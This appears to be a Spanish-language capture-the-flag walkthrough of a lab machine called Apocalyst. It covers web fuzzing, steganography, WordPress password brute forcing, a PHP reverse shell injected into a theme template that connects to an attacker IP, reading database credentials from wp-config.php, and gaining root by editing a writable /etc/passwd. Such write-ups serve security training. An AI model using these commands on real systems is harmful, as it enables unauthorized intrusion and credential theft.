## Summary

- IP -> 10.10.10.46
- Ports -> TCP (22, 80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> Open SSH 7.2p2 Ubuntu 4ubuntu2.2
    - 80 -> WordPress 4.8

## Recon
Webpage 
- **/etc/host** Colocar la ruta ahi, porque esta aplicando virtual hosting
- Ruta de Login en WP **http:// apocalyst.htb/wp-admin.php** Es la ruta del panel de autenticacion de WordPress
- Comando -> **curl -s -X GET http://apocalyst.htb/wp-json/wp/v2/users/** Miramos para ver si nos reporta un Json, en este caso no existe esa ruta en WP

Podemos buscar en searchsploit **ssh user enumeration** <7.7 un exploit en Python2
- Comando -> **python2 45939.py < VICTIM IP> < USER> 2/dev/null** Para confirmar si ese usuario existe en esa IP

- Comando -> **wfuzz -c -L --hc=404 --hh=157 -t 200 -w < RUTA DICCIONARIO> < http:// apocalyst.htb/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas, L=follow del redirect si el codigo es 301). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
	Ruta del diccionario **/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 

Cuando una pagina web tiene mucho texto, podemos usar eso para hacer un diccionario con esas palabras y asi podria ser mas personlizado.
- Comando -> **cewl -w Diccionario.txt http://apocalyst.htb/** Creas un diccionario mas 'personalizado' con las palabras de una webpage y te regresa un archivo de texto
- Comando -> **wfuzz -c -L --hc=404 --hh=157 -t 200 -w < RUTA DICCIONARIO> < http:// apocalyst.htb/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con el diccionario que creamos de la webpage
	Ruta del diccionario **Diccionario.txt**

Encontramos una nueva ruta que contiene una imagen, pero esta imagen tiene mas caracteres. Por lo que podemos decir que en ella hay oculto un archivo de texto o algo. 

- Comando -> **exiftool <Image.jpg>** Con esa herramienta podemos ver los metadatos de una imagen 
- Comando -> **steghide info <Image.jpg>** Para ver si la imagen tiene contenido oculto
-  Comando -> **steghide extract -sf <Image.jpg>** Para ver si la imagen tiene contenido oculto (sf=sourcefile)

Noe extrae un diccionario llamado list.txt (rutas, passwd, etc...)

- Comando -> **wpscan --url http://apocalyst.htb/** Detecta vulnerabilidades, pluggins
- Comando -> **wpscan --url http://apocalyst.htb/ --enumerate u** Enumeras usuarios que puedan existir en un WordPress
- Comando -> **wpscan --url http://apocalyst.htb/ -U falaraki -P list.txt** Aplicas fuerza bruta, en donde colocas el usuario y en este caso el diccionario de las passwd

Probamos el usuario y passwd en el panel de login
Ruta de Login en WP **http:// apocalyst.htb/wp-admin.php** Es la ruta del panel de autenticacion de WordPress

## User

Dentro de un WP podemos editar ese template y colocar un comando. Appearance ->Editor -> 404 Template
<?p
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
?>
Colocamos ese comando de ReverShell en la webpage

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux
- Comando -> **curl -s -X GET http://apocalyst.htb/?p=404** Apuntas a una ruta 404 y haces la peticion

Una vez adentro hacemos tratamiento de la TTY
Buscamos la flag user.txt 


- Comando -> **uname -a** Enumeras la version del Kernel
- Comando -> **lsb_release -a** Nos proporciona informacion de que Linux es

- Comando -> **id** Identificador de los usuarios (UID), root=UID=0
- Comando -> **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
- Comando -> **find / -perm -4000 -user root -ls 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root, ademas de que nos reportara el usuario, grupo y permisos, pero no encontramos nada
- Comando -> **which getcap** Para ver si esta instalado el Getcap y mirar las capabilities
	* Comando -> **getcap -r / 2>/dev/null** Listamos las capabilities que existan desde la raiz de forma recursiva
		**cap_setuid+ep** Esperando encontrar ese
- Comando -> **cat /etc/crontab** Tareas CRON, que son tareas que se ejecutan a intervalos regulares de tiempos en el sistema 

- Comando -> **ps -faux** Listas los procesos que corren en la maquina Linux
Miramos que esta corriendo MySQL y tienen el tipico archivo 
	**cat wp-config.php | less** Este archivo suele disponer de credenciales de acceso a la base de datos, y lo miramos en formato de pagina 

Ahi encontraremos el usuario root y su passwd pero de la base de datos de mysql
Nos conectamos a la base de datos de esta manera 
- Comando -> **mysql -u < user> -p** Nos conectamos y le proporcionamos la password encontrada en el archivo anterior
- **>show databases;** Muestra las bases de datos
- **>use *wp_myblog*;** Usamos una base de datos especifica, en este caso llamada mattermost
- **>show tables;** Mostramos el contenido de las tablas de la base de datos
- **>describe *wp_users*;** Miramos que columnas existen
- **>select *user_login,user_pass* from *wp_users*;** Seleccionamos los campos de una tabla especifica, pero encontramos la passwd que ya teniamos 


## Root
- Comando -> **find / -writable 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"** Buscamos archivo desde la raiz con capacidad de escritura y los errores los ocultamos, ademas de quitar (vE=quitas multiples palabras) vas,dev,run, etc... y al final encontraremos **/etc/passwd**
- Comando -> **find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"** Buscamos archivo desde la raiz con capacidad de escritura y los errores los ocultamos, ademas de quitar (vE=quitas multiples palabras) vas,dev,run, etc... y al final encontraremos **/etc/passwd**, con ls podemos ver el propietario y si el grupo otros pueden modificarlo (w=write)
		Si podemos entrar al **/etc/passwd** podemos ponerle al usuario root una passwd directamente hasheada de forma hardcodeada, para que al momento de hacer un **sudo su** compare directamente con lo que colocamos y no lo lea del **/etc/shadow**
	- Comando -> **openssl passwd** Creamos una passwd en formato DES(unix), y este lo colocaremos en la parte verde de root:**x**:0:0 y guardamos el archivo

Ahora hacemos sudo su 
Nos convertimos en root y miramos la flag root.txt